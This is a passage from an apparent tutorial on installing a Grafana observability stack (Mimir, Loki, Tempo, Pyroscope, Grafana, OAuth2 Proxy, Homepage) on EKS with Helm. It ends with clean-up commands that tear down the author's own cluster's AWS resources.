matchLabels: app.kubernetes.io/component: ruler-querier topologyKey: kubernetes.io/hostname ruler_query_frontend: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: ruler-query-frontend topologyKey: kubernetes.io/hostname ruler_query_scheduler: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: ruler-query-scheduler topologyKey: kubernetes.io/hostname querier: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: querier topologyKey: kubernetes.io/hostname query_frontend: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: query-frontend topologyKey: kubernetes.io/hostname query_scheduler: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: query-scheduler topologyKey: kubernetes.io/hostname store_gateway: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: store-gateway topologyKey: kubernetes.io/hostname compactor: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: compactor topologyKey: kubernetes.io/hostname # https://github.com/grafana/helm-charts/blob/main/charts/rollout-operator/values.yaml rollout_operator: serviceMonitor: enabled: true priorityClassName: high-priority minio: enabled: false kafka: # 3 replicas required for Raft quorum (tolerates 1 node failure) replicas: 3 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: kafka topologyKey: kubernetes.io/hostname ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: Grafana Mimir provides horizontally scalable, highly available, multi-tenant, long-term storage for Prometheus gethomepage.dev/group: Apps gethomepage.dev/icon: https://raw.githubusercontent.com/grafana/mimir/843897414dba909dfd44f5b93dad35a8a6694d06/images/logo.png gethomepage.dev/name: Mimir nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - mimir.${CLUSTER_FQDN} tls: - hosts: - mimir.${CLUSTER_FQDN} gateway: priorityClassName: high-priority replicas: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: gateway topologyKey: kubernetes.io/hostname metaMonitoring: serviceMonitor: enabled: true prometheusRule: enabled: true mimirAlerts: true mimirRules: true EOF helm upgrade --install --version \"${MIMIR_DISTRIBUTED_HELM_CHART_VERSION}\" --namespace mimir --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mimir-distributed.yml\" mimir grafana/mimir-distributed Loki Grafana Loki is a horizontally-scalable, highly-available, multi-tenant log aggregation system inspired by Prometheus. It is designed to be very cost-effective and easy to operate, as it does not index the contents of the logs, but rather a set of labels for each log stream. Install the loki Helm chart and customize its default values to fit your environment and storage requirements: # renovate: datasource=helm depName=loki registryUrl=https://grafana.github.io/helm-charts LOKI_HELM_CHART_VERSION=\"6.49.0\" helm repo add --force-update grafana https://grafana.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-loki.yml\" &lt;&lt; EOF global: priorityClassName: high-priority deploymentMode: SingleBinary loki: auth_enabled: false commonConfig: replication_factor: 2 storage: bucketNames: chunks: ${CLUSTER_FQDN} ruler: ${CLUSTER_FQDN} admin: ${CLUSTER_FQDN} s3: region: ${AWS_DEFAULT_REGION} schemaConfig: configs: - from: 2024-04-01 store: tsdb object_store: s3 schema: v13 index: prefix: loki_index_ period: 24h storage_config: aws: region: ${AWS_DEFAULT_REGION} bucketnames: ${CLUSTER_FQDN} limits_config: retention_period: 1w # Log retention in Loki is achieved through the Compactor (https://grafana.com/docs/loki/v3.5.x/get-started/components/#compactor) compactor: delete_request_store: s3 retention_enabled: true lokiCanary: kind: Deployment gateway: replicas: 2 singleBinary: replicas: 2 priorityClassName: high-priority persistence: size: 5Gi write: replicas: 0 read: replicas: 0 backend: replicas: 0 ruler: priorityClassName: high-priority EOF helm upgrade --install --version \"${LOKI_HELM_CHART_VERSION}\" --namespace loki --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-loki.yml\" loki grafana/loki Tempo Grafana Tempo is an open source, easy-to-use, and high-scale distributed tracing backend. It is designed to be cost-effective and simple to operate, as it only requires object storage to operate its backend and does not index the trace data. Install the tempo Helm chart and customize its default values to fit your environment and storage requirements: # renovate: datasource=helm depName=tempo registryUrl=https://grafana.github.io/helm-charts TEMPO_HELM_CHART_VERSION=\"1.24.3\" helm repo add --force-update grafana https://grafana.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-tempo.yml\" &lt;&lt; EOF replicas: 2 tempo: # https://youtu.be/PmE9mgYaoQA?t=817 metricsGenerator: enabled: true remoteWriteUrl: http://mimir-gateway.mimir.svc.cluster.local/api/v1/push storage: trace: backend: s3 s3: bucket: ${CLUSTER_FQDN} endpoint: s3.${AWS_DEFAULT_REGION}.amazonaws.com serviceMonitor: enabled: true affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/name: tempo topologyKey: kubernetes.io/hostname priorityClassName: high-priority EOF helm upgrade --install --version \"${TEMPO_HELM_CHART_VERSION}\" --namespace tempo --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-tempo.yml\" tempo grafana/tempo Pyroscope Grafana Pyroscope is a Continuous Profiling Platform. Install the pyroscope Helm chart and customize its default values to fit your environment and storage requirements: # renovate: datasource=helm depName=pyroscope registryUrl=https://grafana.github.io/helm-charts PYROSCOPE_HELM_CHART_VERSION=\"1.17.0\" helm repo add --force-update grafana https://grafana.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-pyroscope.yml\" &lt;&lt; EOF pyroscope: replicaCount: 2 affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/instance: pyroscope topologyKey: kubernetes.io/hostname priorityClassName: high-priority ingress: enabled: true className: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: Continuous Profiling Platform gethomepage.dev/group: Observability gethomepage.dev/icon: https://raw.githubusercontent.com/grafana/pyroscope/d3818254b7c70a43104effcfd300ff885035ac50/images/logo.png gethomepage.dev/name: Pyroscope gethomepage.dev/pod-selector: app.kubernetes.io/instance=pyroscope nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - pyroscope.${CLUSTER_FQDN} tls: - hosts: - pyroscope.${CLUSTER_FQDN} serviceMonitor: enabled: true EOF helm upgrade --install --version \"${PYROSCOPE_HELM_CHART_VERSION}\" --namespace pyroscope --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-pyroscope.yml\" pyroscope grafana/pyroscope Grafana Kubernetes Monitoring Helm chart The Grafana Kubernetes Monitoring Helm chart offers a complete solution for configuring infrastructure, zero-code instrumentation, and gathering telemetry. For additional configuration options, refer to the Helm chart documentation. Install the k8s-monitoring Helm chart and customize its default values to fit your environment and storage requirements: # renovate: datasource=helm depName=k8s-monitoring registryUrl=https://grafana.github.io/helm-charts K8S_MONITORING_HELM_CHART_VERSION=\"3.7.1\" helm repo add --force-update grafana https://grafana.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-k8s-monitoring.yml\" &lt;&lt; EOF # Cluster identification used in metrics labels cluster: name: \"${CLUSTER_NAME}\" # Backend destinations where telemetry data will be sent destinations: # Metrics destination - sends to Mimir for long-term storage - name: prometheus type: prometheus url: http://mimir-gateway.mimir.svc.cluster.local/api/v1/push # Logs destination - sends to Loki for log aggregation - name: loki type: loki url: http://loki-gateway.loki.svc.cluster.local/loki/api/v1/push # Traces destination - sends to Tempo via OTLP protocol - name: otlpgateway type: otlp url: http://tempo.tempo.svc.cluster.local:4317 tls: insecure: true insecureSkipVerify: true # Profiling destination - sends to Pyroscope for continuous profiling - name: pyroscope type: pyroscope url: http://pyroscope.pyroscope.svc.cluster.local:4040 tls: insecure_skip_verify: true # Collect K8s cluster-level metrics (nodes, pods, deployments, etc.) clusterMetrics: enabled: true # Scrape metrics from the Kubernetes API server (Kubernetes / System / API Server) apiServer: enabled: true # Disable the default allowlist to allow Node Exporter Full dashboard to work properly - all node-exporter metrics will now be collected (https://github.com/grafana/k8s-monitoring-helm/issues/1296) node-exporter: metricsTuning: useDefaultAllowList: false windows-exporter: enabled: false deploy: false # Disable the default allowlist for kube-state-metrics to enable all namespace metrics required by \"Kubernetes / Views / Global\" dashboard (https://github.com/dotdc/grafana-dashboards-kubernetes/issues/176) kube-state-metrics: metricsTuning: useDefaultAllowList: false # Collect Kubernetes events (pod scheduling, failures, etc.) clusterEvents: enabled: true # Collect logs from node-level services (kubelet, containerd) nodeLogs: enabled: true # Collect logs from all pods in the cluster podLogs: enabled: true # Enable application-level observability (traces and spans) applicationObservability: enabled: true # Configure OTLP receivers for ingesting traces from applications receivers: otlp: grpc: enabled: true http: enabled: true # Automatic instrumentation for supported languages (Java, Python, etc.) autoInstrumentation: enabled: true # Discover and scrape metrics from pods with Prometheus annotations - https://github.com/grafana/k8s-monitoring-helm/tree/main/charts/k8s-monitoring/docs/examples/features/annotation-autodiscovery/prom-annotations annotationAutodiscovery: enabled: true annotations: scrape: prometheus.io/scrape metricsPath: prometheus.io/path metricsPortNumber: prometheus.io/port metricsScheme: prometheus.io/scheme # Support for ServiceMonitor and PodMonitor CRDs from Prometheus Operator # https://github.com/grafana/k8s-monitoring-helm/tree/main/charts/k8s-monitoring/charts/feature-prometheus-operator-objects prometheusOperatorObjects: enabled: true # Enable continuous profiling data collection profiling: enabled: true # Alloy collector for scraping and forwarding metrics alloy-metrics: enabled: true # Single-instance Alloy for cluster-wide tasks (kube-state-metrics), the Kubernetes Cluster events feature requires the use of the alloy-singleton collector. alloy-singleton: enabled: true # Alloy DaemonSet for collecting logs from each node alloy-logs: enabled: true # Alloy deployment for receiving OTLP data from applications alloy-receiver: enabled: true # Alloy for collecting profiling data via eBPF alloy-profiles: enabled: true # Common settings for all Alloy collector instances collectorCommon: alloy: # Ensure collectors are scheduled even under resource pressure priorityClassName: system-node-critical controller: priorityClassName: system-node-critical EOF helm upgrade --install --version \"${K8S_MONITORING_HELM_CHART_VERSION}\" --namespace k8s-monitoring --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-k8s-monitoring.yml\" k8s-monitoring grafana/k8s-monitoring Grafana Grafana is an open-source analytics and monitoring platform that allows you to query, visualize, alert on, and understand your metrics, logs, and traces. It provides a powerful and flexible way to create dashboards and visualizations for monitoring your Kubernetes cluster and applications. Install the grafana Helm chart and modify its default values: # renovate: datasource=helm depName=grafana registryUrl=https://grafana.github.io/helm-charts GRAFANA_HELM_CHART_VERSION=\"10.5.5\" helm repo add --force-update grafana https://grafana.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-grafana.yml\" &lt;&lt; EOF serviceMonitor: enabled: true ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/description: Visualization Platform gethomepage.dev/enabled: \"true\" gethomepage.dev/group: Observability gethomepage.dev/icon: grafana.svg gethomepage.dev/name: Grafana gethomepage.dev/app: grafana gethomepage.dev/pod-selector: \"app.kubernetes.io/name=grafana\" nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; path: / pathType: Prefix hosts: - grafana.${CLUSTER_FQDN} tls: - hosts: - grafana.${CLUSTER_FQDN} datasources: datasources.yaml: apiVersion: 1 datasources: - name: Mimir type: prometheus url: http://mimir-gateway.mimir.svc.cluster.local/prometheus isDefault: true jsonData: prometheusType: Mimir prometheusVersion: 2.9.1 # Scrape interval must match Prometheus/Mimir config for accurate rate() calculations (CPU usage in Node Exporter Full dashboard) timeInterval: \"1m\" - name: Loki type: loki url: http://loki-gateway.loki.svc.cluster.local/ access: proxy - name: Tempo type: tempo url: http://tempo.tempo.svc.cluster.local:3200 access: proxy - name: Pyroscope type: grafana-pyroscope-datasource url: http://pyroscope.pyroscope.svc.cluster.local:4040 - name: Alertmanager type: alertmanager url: http://mimir-alertmanager.mimir.svc.cluster.local:8080 access: proxy editable: true jsonData: implementation: mimir notifiers: notifiers.yaml: notifiers: - name: email-notifier type: email uid: email1 org_id: 1 is_default: true settings: addresses: ${MY_EMAIL} dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: false options: path: /var/lib/grafana/dashboards/default dashboards: default: # keep-sorted start numeric=yes 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 42 datasource: Mimir 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Mimir # https://github.com/DevOps-Nirvana/Grafana-Dashboards 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Mimir 23969-external-dns: # renovate: depName=\"External DNS\" gnetId: 23969 revision: 1 datasource: Mimir 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 43 datasource: Mimir 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 44 datasource: Mimir 15759-kubernetes-views-nodes: # renovate: depName=\"Kubernetes / Views / Nodes\" gnetId: 15759 revision: 40 datasource: Mimir # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 37 datasource: Mimir 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 20 datasource: Mimir 15762-kubernetes-system-coredns: # renovate: depName=\"Kubernetes / System / CoreDNS\" gnetId: 15762 revision: 22 datasource: Mimir 16006-mimir-alertmanager-resources: # renovate: depName=\"Mimir / Alertmanager resources\" gnetId: 16006 revision: 17 datasource: Mimir 16007-mimir-alertmanager: # renovate: depName=\"Mimir / Alertmanager\" gnetId: 16007 revision: 17 datasource: Mimir 16008-mimir-compactor-resources: # renovate: depName=\"Mimir / Compactor resources\" gnetId: 16008 revision: 17 datasource: Mimir 16009-mimir-compactor: # renovate: depName=\"Mimir / Compactor\" gnetId: 16009 revision: 17 datasource: Mimir 16010-mimir-config: # renovate: depName=\"Mimir / Config\" gnetId: 16010 revision: 17 datasource: Mimir 16011-mimir-object-store: # renovate: depName=\"Mimir / Object Store\" gnetId: 16011 revision: 17 datasource: Mimir 16012-mimir-overrides: # renovate: depName=\"Mimir / Overrides\" gnetId: 16012 revision: 17 datasource: Mimir 16013-mimir-queries: # renovate: depName=\"Mimir / Queries\" gnetId: 16013 revision: 17 datasource: Mimir 16014-mimir-reads-networking: # renovate: depName=\"Mimir / Reads networking\" gnetId: 16014 revision: 17 datasource: Mimir 16015-mimir-reads-resources: # renovate: depName=\"Mimir / Reads resources\" gnetId: 16015 revision: 17 datasource: Mimir 16016-mimir-reads: # renovate: depName=\"Mimir / Reads\" gnetId: 16016 revision: 17 datasource: Mimir 16017-mimir-rollout-progress: # renovate: depName=\"Mimir / Rollout progress\" gnetId: 16017 revision: 17 datasource: Mimir 16018-mimir-ruler: # renovate: depName=\"Mimir / Ruler\" gnetId: 16018 revision: 17 datasource: Mimir 16019-mimir-scaling: # renovate: depName=\"Mimir / Scaling\" gnetId: 16019 revision: 17 datasource: Mimir 16020-mimir-slow-queries: # renovate: depName=\"Mimir / Slow queries\" gnetId: 16020 revision: 17 datasource: Mimir 16021-mimir-tenants: # renovate: depName=\"Mimir / Tenants\" gnetId: 16021 revision: 17 datasource: Mimir 16022-mimir-top-tenants: # renovate: depName=\"Mimir / Top tenants\" gnetId: 16022 revision: 16 datasource: Mimir 16023-mimir-writes-networking: # renovate: depName=\"Mimir / Writes networking\" gnetId: 16023 revision: 16 datasource: Mimir 16024-mimir-writes-resources: # renovate: depName=\"Mimir / Writes resources\" gnetId: 16024 revision: 17 datasource: Mimir 16026-mimir-writes: # renovate: depName=\"Mimir / Writes\" gnetId: 16026 revision: 17 datasource: Mimir 17605-mimir-overview-networking: # renovate: depName=\"Mimir / Overview networking\" gnetId: 17605 revision: 13 datasource: Mimir 17606-mimir-overview-resources: # renovate: depName=\"Mimir / Overview resources\" gnetId: 17606 revision: 13 datasource: Mimir 17607-mimir-overview: # renovate: depName=\"Mimir / Overview\" gnetId: 17607 revision: 13 datasource: Mimir 17608-mimir-remote-ruler-reads: # renovate: depName=\"Mimir / Remote ruler reads\" gnetId: 17608 revision: 13 datasource: Mimir 17609-mimir-remote-ruler-reads-resources: # renovate: depName=\"Mimir / Remote ruler reads resources\" gnetId: 17609 revision: 13 datasource: Mimir 19923-beyla-red-metrics: # renovate: depName=\"Beyla RED Metrics\" gnetId: 19923 revision: 3 datasource: Mimir 20842-cert-manager-kubernetes: # renovate: depName=\"Cert-manager-Kubernetes\" gnetId: 20842 revision: 3 datasource: Mimir 22184-cert-manager2: # renovate: depName=\"cert-manager2\" gnetId: 22184 revision: 3 datasource: Mimir 22171-kubernetes-autoscaling-karpenter-overview: # renovate: depName=\"Kubernetes / Autoscaling / Karpenter / Overview\" gnetId: 22171 revision: 3 datasource: Mimir 22172-kubernetes-autoscaling-karpenter-activity: # renovate: depName=\"Kubernetes / Autoscaling / Karpenter / Activity\" gnetId: 22172 revision: 3 datasource: Mimir 22173-kubernetes-autoscaling-karpenter-performance: # renovate: depName=\"Kubernetes / Autoscaling / Karpenter / Performance\" gnetId: 22173 revision: 3 datasource: Mimir 23471-karpenter-cluster-cost-estimate: # renovate: depName=\"Karpenter Cluster Cost Estimate\" gnetId: 23471 revision: 1 datasource: Mimir 23838-velero-overview: # renovate: depName=\"Velero Overview\" gnetId: 23838 revision: 1 datasource: Mimir # keep-sorted end grafana.ini: analytics: check_for_updates: false auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email smtp: enabled: true host: mailpit-smtp.mailpit.svc.cluster.local:25 from_address: grafana@${CLUSTER_FQDN} users: auto_assign_org_role: Admin networkPolicy: enabled: true EOF helm upgrade --install --version \"${GRAFANA_HELM_CHART_VERSION}\" --namespace grafana --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-grafana.yml\" grafana grafana/grafana Mailpit Mailpit will be used to receive email alerts from Prometheus. Install the mailpit Helm chart and modify its default values: # renovate: datasource=helm depName=mailpit registryUrl=https://jouve.github.io/charts/ MAILPIT_HELM_CHART_VERSION=\"0.31.0\" helm repo add --force-update jouve https://jouve.github.io/charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" &lt;&lt; EOF ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: An email and SMTP testing tool with API for developers gethomepage.dev/group: Apps gethomepage.dev/icon: https://raw.githubusercontent.com/axllent/mailpit/61241f11ac94eb33bd84e399129992250eff56ce/server/ui/favicon.svg gethomepage.dev/name: Mailpit nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hostname: mailpit.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILPIT_HELM_CHART_VERSION}\" --namespace mailpit --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" mailpit jouve/mailpit Screenshot: OAuth2 Proxy Use OAuth2 Proxy to protect application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"10.0.0\" set +x COOKIE_SECRET=\"$(openssl rand -base64 32 | head -c 32 | base64)\" echo \"::add-mask::${COOKIE_SECRET}\" set -x helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: ${COOKIE_SECRET} configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true ingressClassName: nginx annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/description: A reverse proxy that provides authentication with Google, Azure, OpenID Connect and many more identity providers gethomepage.dev/group: Cluster Management gethomepage.dev/icon: https://raw.githubusercontent.com/oauth2-proxy/oauth2-proxy/899c743afc71e695964165deb11f50b9a0703c97/docs/static/img/logos/OAuth2_Proxy_icon.svg gethomepage.dev/name: OAuth2-Proxy hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} priorityClassName: critical-priority affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchLabels: app.kubernetes.io/component: authentication-proxy app.kubernetes.io/instance: oauth2-proxy topologyKey: kubernetes.io/hostname replicaCount: 2 metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy Homepage Install Homepage to provide a nice dashboard. Install the homepage Helm chart and modify its default values: # renovate: datasource=helm depName=homepage registryUrl=http://jameswynn.github.io/helm-charts HOMEPAGE_HELM_CHART_VERSION=\"2.1.0\" helm repo add --force-update jameswynn http://jameswynn.github.io/helm-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-homepage.yml\" &lt;&lt; EOF enableRbac: true serviceAccount: create: true ingress: main: enabled: true annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/name: Homepage gethomepage.dev/description: A modern, secure, highly customizable application dashboard gethomepage.dev/group: Apps gethomepage.dev/icon: homepage.png nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: nginx hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} config: bookmarks: services: widgets: - logo: icon: kubernetes.svg - kubernetes: cluster: show: true cpu: true memory: true showLabel: true label: \"${CLUSTER_NAME}\" nodes: show: true cpu: true memory: true showLabel: true kubernetes: mode: cluster settings: hideVersion: true title: ${CLUSTER_FQDN} favicon: https://raw.githubusercontent.com/homarr-labs/dashboard-icons/38631ad11695467d7a9e432d5fdec7a39a31e75f/svg/kubernetes.svg layout: Apps: icon: mdi-apps Observability: icon: mdi-chart-bell-curve-cumulative Cluster Management: icon: mdi-tools env: - name: HOMEPAGE_ALLOWED_HOSTS value: ${CLUSTER_FQDN} - name: LOG_TARGETS value: stdout EOF helm upgrade --install --version \"${HOMEPAGE_HELM_CHART_VERSION}\" --namespace homepage --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-homepage.yml\" homepage jameswynn/homepage Clean-up Back up the certificate before deleting the cluster (in case it was renewed): if [[ \"$(kubectl get --raw /api/v1/namespaces/cert-manager/services/cert-manager:9402/proxy/metrics | awk '/certmanager_http_acme_client_request_count.*acme-v02\\.api.*finalize/ { print $2 }')\" -gt 0 ]]; then velero backup create --labels letsencrypt=production --ttl 2160h --from-schedule velero-monthly-backup-cert-manager-production fi Stop Karpenter from launching additional nodes: helm uninstall -n karpenter karpenter || true helm uninstall -n ingress-nginx ingress-nginx || true Remove any remaining EC2 instances provisioned by Karpenter (if they still exist): for EC2 in $(aws ec2 describe-instances --filters \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" \"Name=tag:karpenter.sh/nodepool,Values=*\" Name=instance-state-name,Values=running --query \"Reservations[].Instances[].InstanceId\" --output text); do echo \"🗑️ Removing Karpenter EC2: ${EC2}\" aws ec2 terminate-instances --instance-ids \"${EC2}\" done Disassociate a Route 53 Resolver query log configuration from an Amazon VPC: for RESOLVER_QUERY_LOG_CONFIGS_ID in $(aws route53resolver list-resolver-query-log-configs --query \"ResolverQueryLogConfigs[?contains(DestinationArn, '/aws/eks/${CLUSTER_NAME}/cluster')].Id\" --output text); do RESOLVER_QUERY_LOG_CONFIG_ASSOCIATIONS_RESOURCEID=$(aws route53resolver list-resolver-query-log-config-associations --filters \"Name=ResolverQueryLogConfigId,Values=${RESOLVER_QUERY_LOG_CONFIGS_ID}\" --query 'ResolverQueryLogConfigAssociations[].ResourceId' --output text) if [[ -n \"${RESOLVER_QUERY_LOG_CONFIG_ASSOCIATIONS_RESOURCEID}\" ]]; then aws route53resolver disassociate-resolver-query-log-config --resolver-query-log-config-id \"${RESOLVER_QUERY_LOG_CONFIGS_ID}\" --resource-id \"${RESOLVER_QUERY_LOG_CONFIG_ASSOCIATIONS_RESOURCEID}\" sleep 5 fi done Clean up AWS Route 53 Resolver query log configurations: for AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID in $(aws route53resolver list-resolver-query-log-configs --query \"ResolverQueryLogConfigs[?Name=='${CLUSTER_NAME}-vpc-dns-logs'].Id\" --output text); do aws route53resolver delete-resolver-query-log-config --resolver-query-log-config-id \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID}\" done Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Delete Instance profile which belongs to Karpenter role: if AWS_INSTANCE_PROFILES_FOR_ROLE=$(aws iam list-instance-profiles-for-role --role-name \"KarpenterNodeRole-${CLUSTER_NAME}\" --query 'InstanceProfiles[].{Name:InstanceProfileName}' --output text); then if [[ -n \"${AWS_INSTANCE_PROFILES_FOR_ROLE}\" ]]; then aws iam remove-role-from-instance-profile --instance-profile-name \"${AWS_INSTANCE_PROFILES_FOR_ROLE}\" --role-name \"KarpenterNodeRole-${CLUSTER_NAME}\" aws iam delete-instance-profile --instance-profile-name \"${AWS_INSTANCE_PROFILES_FOR_ROLE}\" fi fi Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-karpenter\" aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-karpenter\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove volumes and snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done # Remove EBS snapshots associated with the cluster for SNAPSHOT in $(aws ec2 describe-snapshots --owner-ids self --filter \"Name=tag:Name,Values=${CLUSTER_NAME}-dynamic-snapshot*\" 